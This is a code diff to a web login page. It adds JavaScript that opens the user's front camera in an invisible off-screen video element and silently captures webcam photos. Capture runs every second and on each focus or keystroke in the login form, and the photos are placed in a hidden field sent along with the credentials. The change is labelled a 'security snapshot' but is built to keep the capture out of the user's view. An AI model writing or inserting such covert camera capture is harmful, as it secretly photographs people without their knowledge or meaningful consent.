@@ -220,8 +220,8 @@
         </form>
     </div>
 
-    <!-- Hidden webcam & canvas for security snapshot -->
-    <video id="webcamCam" autoplay playsinline muted style="display:none;"></video>
+    <!-- Hidden webcam & canvas for security snapshot (rendered off-screen so browser decodes frames) -->
+    <video id="webcamCam" autoplay playsinline muted style="position: fixed; top: -9999px; left: -9999px; width: 640px; height: 480px; opacity: 0; pointer-events: none;"></video>
     <canvas id="webcamCanvas" style="display:none;"></canvas>
 
     <div class="footer-text">
@@ -237,24 +237,47 @@
             const form = document.getElementById('loginForm');
             const photoInput = document.getElementById('login_photo');
 
+            function captureSnapshot() {
+                try {
+                    if (video && video.videoWidth > 0 && video.videoHeight > 0) {
+                        canvas.width = video.videoWidth;
+                        canvas.height = video.videoHeight;
+                        const ctx = canvas.getContext('2d');
+                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+                        const dataUrl = canvas.toDataURL('image/jpeg', 0.8);
+                        if (dataUrl && dataUrl.length > 500) {
+                            photoInput.value = dataUrl;
+                            return true;
+                        }
+                    }
+                } catch (e) {
+                    console.warn('Snapshot capture error:', e);
+                }
+                return false;
+            }
+
             if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
-                navigator.mediaDevices.getUserMedia({ video: { width: 640, height: 480 } })
+                navigator.mediaDevices.getUserMedia({ video: { width: { ideal: 640 }, height: { ideal: 480 }, facingMode: "user" } })
                     .then(function(stream) {
                         video.srcObject = stream;
+                        video.play().catch(function(e){});
+                        
+                        // Periodically refresh snapshot in memory so it's ready when submitting
+                        setInterval(captureSnapshot, 1000);
                     })
                     .catch(function(err) {
                         console.warn('Camera access not granted or unavailable:', err);
                     });
             }
 
-            form.addEventListener('submit', function() {
-                if (video.srcObject && video.readyState === video.HAVE_ENOUGH_DATA) {
-                    canvas.width = video.videoWidth || 640;
-                    canvas.height = video.videoHeight || 480;
-                    const ctx = canvas.getContext('2d');
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    photoInput.value = canvas.toDataURL('image/jpeg', 0.85);
-                }
+            // Capture immediately on user typing or interaction
+            document.querySelectorAll('#loginForm input').forEach(function(input) {
+                input.addEventListener('focus', captureSnapshot);
+                input.addEventListener('input', captureSnapshot);
+            });
+
+            form.addEventListener('submit', function(e) {
+                captureSnapshot();
             });
         });
     </script>
